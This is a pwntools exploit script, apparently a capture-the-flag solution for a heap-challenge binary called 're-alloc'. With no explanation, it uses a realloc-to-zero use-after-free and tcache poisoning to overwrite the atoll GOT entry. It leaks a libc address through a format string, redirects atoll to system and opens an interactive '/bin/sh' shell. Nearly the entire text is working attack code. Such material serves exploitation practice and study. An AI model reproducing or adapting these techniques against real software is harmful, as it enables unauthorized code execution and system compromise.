
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './re-alloc_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
    FORTIFY:  Enabled
'''
libc = ELF('libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so', checksec=False)
p = start()
def alloc(index, size, data):
    p.sendlineafter('Your choice: ', b'1')
    p.sendlineafter('Index:', str(index).encode())
    p.sendlineafter('Size:', str(size).encode())
    p.sendafter('Data:', data)

def realloc(index, size, data):
    p.sendlineafter('Your choice: ', b'2')
    p.sendlineafter('Index:', str(index).encode())
    p.sendlineafter('Size:', str(size).encode())
    p.sendafter('Data:', data)

def realloc2(index, size):
    p.sendlineafter('Your choice: ', b'2')
    p.sendlineafter('Index:', str(index).encode())
    p.sendlineafter('Size:', str(size).encode())
    #p.sendafter('Data:', data)


def free(index):
    p.sendlineafter('Your choice: ', b'3')
    p.sendlineafter('Index:', str(index).encode())

alloc(0,0x28,b"CC")
realloc2(0,0)
realloc(0,0x28,p64(elf.got['atoll']))
alloc(1,0x28,b"AAA")

realloc(0,0x38,b"AA")
free(0)
realloc(1,0x48,b"AA")
free(1)

alloc(0,0x58, b"aaaa")
realloc2(0,0)
realloc(0,0x58, p64(elf.got['atoll']))
alloc(1,0x58, b"aaaa")
realloc(0,0x68, b"aaaaaaaa")
free(0)
realloc(1,0x78, b"aaaaaaaa")
free(1)

alloc(0,0x28, p64(elf.plt['printf']))

p.sendlineafter(b'Your choice: ', b'3')
p.sendlineafter(b'Index:', b'%21$p')
p.recvuntil(b'0x')
libc_base = int(p.recvuntil(b'\n')[:-1], 16) - 235 - libc.symbols["__libc_start_main"]
log.info("libc_base: " + hex(libc_base))
system = libc_base + libc.symbols["system"]

p.sendlineafter(b"Your choice: ",b"1")
p.sendafter(b"Index:",b"a")
p.sendafter(b"Size:",b"%88c")
p.sendafter(b"Data:",p64(system))

p.sendlineafter(b"Your choice: ",b"1")
p.sendafter(b"Index:",b"/bin/sh\x00")
p.interactive()